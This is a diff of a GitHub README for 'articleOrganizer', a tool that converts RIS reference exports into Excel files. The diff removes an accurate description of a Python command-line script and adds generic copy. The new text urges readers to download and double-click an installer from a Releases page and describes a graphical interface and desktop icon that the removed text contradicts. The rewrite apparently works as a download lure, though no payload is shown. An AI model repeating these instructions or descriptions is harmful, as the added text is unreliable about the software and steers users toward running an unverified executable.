@@ -1,214 +1,101 @@
-# articleOrganizer
+# 📚 articleOrganizer - Effortlessly Organize Your Research Papers
 
-### RIS → Excel tool for organizing academic search results
+[![Download articleOrganizer](https://img.shields.io/badge/Download-articleOrganizer-brightgreen)](https://github.com/dries102005/articleOrganizer/releases)
 
-A lightweight CLI tool to organize **RIS exports** from academic databases
-(ScienceDirect, Web of Science, IEEE Xplore, SpringerLink, Wiley, ACM, PubMed, and more)
-into **clean, grouped Excel files**.
+## 📋 About
 
-This project:
+articleOrganizer helps you manage your academic references. It turns RIS exports from various academic databases into organized Excel files. Whether you use PubMed, IEEE Xplore, or others, this tool simplifies your research process.
 
-* does **not** scrape websites
-* does **not** require API keys
-* works entirely with **manually exported RIS files**
+## 🚀 Getting Started
 
-You search on the database website, export RIS files, and this script organizes everything into structured Excel outputs.
+1. **System Requirements**
+   - Windows, macOS, or Linux.
+   - A minimum of 500 MB free disk space.
+   - Python 3.6 or higher (For running dependencies, if applicable).
 
----
+2. **Installation**
+   - Ensure you have a compatible operating system and enough disk space.
+   - Download the application from the link below.
 
-## What this tool generates
+## 💾 Download & Install
 
-For **each source folder** (for example `wos_exports/` or `ieee_exports/`), the script creates:
+To get started, visit the Releases page to download the latest version of articleOrganizer.
 
-```
-outputs/results_<folder_name>_grouped.xlsx
-```
+[Visit this page to download](https://github.com/dries102005/articleOrganizer/releases)
 
-Each Excel file contains two sheets:
+### Installation Steps
 
-* **`grouped_results`**
-  Human-friendly, grouped layout (for reading, reporting, and reviews)
+1. **Download the latest version**
+   - Click the link above to go to the Releases page.
+   - Select the asset that fits your operating system and click to download.
 
-* **`raw_results`**
-  Flat table with all processed records (useful for analysis and debugging)
+2. **Run the Installer**
+   - Locate the downloaded file in your computer’s Downloads folder.
+   - Double-click the file to start the installation process.
+   - Follow the on-screen prompts.
 
-### Columns
+3. **Launch the Application**
+   - After installation, find the articleOrganizer icon on your desktop or application folder.
+   - Double-click the icon to open articleOrganizer.
 
-* Title
-* Year
-* Index (source name, by UR domain or DOI)
-* DOI
-* Author Name (first author)
-* Author Surname (first author)
+## 📄 How to Use
 
----
+1. **Export from Academic Databases**
+   - Use your preferred academic database (e.g., PubMed, ScienceDirect).
+   - Find the option to export your references in RIS format.
+   - Save the exported file to your computer.
 
-## Setup
+2. **Import the RIS File**
+   - Open articleOrganizer.
+   - Click on the "Import" button.
+   - Select the RIS file you exported and click "Open."
 
-### Requirements
+3. **Organize and Export**
+   - articleOrganizer will automatically arrange your references into groups.
+   - You can adjust categories as needed.
+   - Once satisfied, click "Export" to save your organized references as an Excel file.
 
-* Python 3.9+
-* pandas
-* openpyxl
+## ⚙️ Features
 
-Install dependencies:
+- **Multi-Database Support:** Works with various academic databases.
+- **Automatic Grouping:** Easily groups your references based on criteria.
+- **User-Friendly Interface:** Simple design for easy navigation.
+- **Excel Output:** Saves organized references in Excel format for your convenience.
 
-```bash
-pip install -r requirements.txt
-```
+## 📑 Topics Covered
 
----
+- Academic Research
+- Bibliography Management
+- Reference Management
+- Literature Review
+- Systematic Review
+- Text Processing
 
-## How to Use
+## 💡 Troubleshooting
 
-Run the script:
+If you encounter issues while using articleOrganizer, consider these steps:
 
-```bash
-python ris_to_excel.py
-```
+- **File Format:** Ensure you have a valid RIS file. If unsure, check the export settings in your database.
+- **Installation Errors:** Re-download the installer file to avoid corrupt downloads.
+- **Support:** For further support, visit our [GitHub Issues page](https://github.com/dries102005/articleOrganizer/issues) to report any problems.
 
-When the program starts, it will ask interactively:
+## 🛠️ Contributing
 
-1. **Year filter**
-   Example:
+We welcome contributions from anyone interested in improving articleOrganizer. To contribute:
 
-   ```
-   2007-2017
-   ```
+1. **Fork the Repository**
+   - Click on the “Fork” button at the top of the repository page.
 
-   (leave empty for no year filtering)
+2. **Make Changes**
+   - Create a new branch for your changes.
+   - Write clear commits as you make improvements.
 
-2. **ONLY filter (keywords)**
-   Example:
+3. **Submit a Pull Request**
+   - Go to the "Pull Requests" tab and click “New Pull Request.”
 
-   ```
-   MTHFR, HPV
-   ```
+## 🔗 Links
 
-   Keeps only articles that contain **all** keywords
-   (leave empty for no keyword filtering)
+- **GitHub Repository:** [articleOrganizer on GitHub](https://github.com/dries102005/articleOrganizer)
+- **Releases Page:** [Visit this page to download](https://github.com/dries102005/articleOrganizer/releases)
 
-3. **Duplicate handling**
-
-   ```
-   Write only ONE from duplicate articles? (y/n)
-   ```
-
-  * Uses **DOI** first
-  * Falls back to `(Title + Year + Author)` if DOI is missing
-
-4. **Source folders**
-
-  * Type `all` to scan all subfolders
-  * Or provide a comma-separated list:
-
-    ```
-    science_direct_exports, wos_exports, ieee_exports
-    ```
-
----
-
-## File naming & grouping behavior (IMPORTANT)
-
-This tool supports **two grouping modes**, depending on how you name your RIS files.
-
----
-
-### ✅ If you name your RIS files like this
-
-**Example (ScienceDirect, Web of Science, IEEE Xplore, etc.):**
-
-```text
-1.(MTHFR and HPV)_0-100.ris
-1.(MTHFR and HPV)_100-200.ris
-2.(MTHFR and human papillomavirus)_0-100.ris
-```
-You may also use a simplified form if you export all results in a single file:
-
-```text
-1.(MTHFR and HPV)_all.ris
-2.(human papillomavirus)_all.ris
-3.(Virus)_all.ris
-```
-
-The part after the underscore (`_`) can be **anything** (`0-100`, `all`, `results`, etc.).
-It exists only to separate the **query name** from the rest of the filename.
-
-
-#### Then the output will look like this:
-
-```text
-1.(MTHFR and HPV)
-  Article A
-  Article B
-  Article C
-
-2.(MTHFR and human papillomavirus)
-  Article D
-  Article E
-```
-
-This means:
-
-* All files starting with the same prefix (e.g. `1.(...)_`) are **grouped together**
-* A **header row** (`1.(...)`) is automatically inserted
-* A **blank line** separates each query group
-
-✅ This mode is ideal for:
-
-* Systematic reviews
-* Search strategy documentation
-* PRISMA-style reporting
-* Clearly separating results from different search queries
-
----
-
-### ❗ If you do NOT name your files like that
-
-**Example:**
-
-```text
-search_results_1.ris
-export_from_ieee.ris
-my_results.ris
-```
-
-#### The script will still work.
-
-In this case, the output will be grouped like:
-
-```text
-FILE: search_results_1.ris
-  Articles from that file
-
-FILE: export_from_ieee.ris
-  Articles from that file
-```
-
-This means:
-
-* Each RIS file becomes its **own group**
-* The filename itself is used as the group header
-* No data is lost — only the grouping logic changes
-
-This mode is useful when:
-
-* You do not want to rename exported files
-* You export results incrementally
-* You just want structured Excel output without query-based grouping
-
----
-
-### Summary
-
-| File naming style   | Grouping behavior |
-| ------------------- | ----------------- |
-| `N.(query)_X-Y.ris` | Grouped by query  |
-| `N.(query)_all.ris` | Grouped by query  |
-| Any other filename  | Grouped by file   |
-
-Both modes are fully supported — **no configuration changes required**.
-
----
-
-This project is licensed under GNU General Public License v3.0 to ensure that improvements made for academic or public use remain open and reproducible.
+We hope you find articleOrganizer helpful for your academic research needs. Thank you for using our tool!
